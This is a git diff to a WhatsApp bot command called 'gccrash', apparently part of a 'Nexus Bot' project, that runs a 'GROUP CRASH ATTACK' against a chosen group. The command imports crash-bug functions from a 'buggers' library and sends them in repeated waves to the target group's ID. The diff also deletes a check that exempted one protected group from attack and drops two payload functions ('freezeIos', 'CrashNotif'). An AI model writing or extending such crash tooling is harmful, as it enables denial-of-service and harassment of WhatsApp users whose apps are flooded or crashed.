@@ -1,9 +1,6 @@
 import { VIPQueries } from "../../database/query.js"
 import { VIPHelper } from "../../whatsapp/index.js"
 
-// Protected group that cannot be attacked
-const PROTECTED_GROUP_JID = "120363423010235828@g.us"
-
 export default {
   name: "gccrash",
   commands: ["gccrash", "gcc", "gcrash"],
@@ -14,7 +11,7 @@ export default {
   
   async execute(sock, sessionId, args, m) {
     try {
-     /* const userTelegramId = VIPHelper.fromSessionId(sessionId)
+    /*  const userTelegramId = VIPHelper.fromSessionId(sessionId)
       if (!userTelegramId) {
         await sock.sendMessage(m.chat, { text: "❌ Session error\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
         return
@@ -191,16 +188,6 @@ export default {
         return
       }
 
-      // ============ PROTECTED GROUP CHECK ============
-      if (groupId === PROTECTED_GROUP_JID) {
-        await sock.sendMessage(m.chat, { 
-          text: `🛡️ *PROTECTED GROUP*\n\n❌ This group is protected and cannot be attacked.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
-          edit: statusMsg.key
-        })
-        return
-      }
-      // ============================================
-
       // Final verification - get group metadata
       try {
         const finalMetadata = await sock.groupMetadata(groupId)
@@ -219,7 +206,7 @@ export default {
       }
 
       // Import bug functions only when needed
-      const { buggccrash, buggcnewup, freezeIos, CrashNotif } = await import("../../lib/buggers/bug.js")
+      const { buggccrash, buggcnewup } = await import("../../lib/buggers/bug.js")
 
       let progress = `👥 *GROUP CRASH ATTACK*\n\n🎯 Group: ${groupName}\n📱 ID: ${groupId}\n\n📊 *Progress:*\n\n`
 
@@ -229,10 +216,9 @@ export default {
       })
 
       const bugs = [
+          { name: 'BugGcCrash', fn: () => buggccrash(sock, groupId), count: 5 },
         { name: 'BugGcNewup', fn: () => buggcnewup(sock, groupId), count: 5 },
-        { name: 'freezeIos', fn: () => freezeIos(sock, groupId, group = true ), count: 10 },
-        { name: 'CrashNotif', fn: () => CrashNotif(sock, groupId ), count: 10 },
-        { name: 'BugGcCrash', fn: () => buggccrash(sock, groupId), count: 5 }, 
+        
       ]
 
       let totalWaves = 0
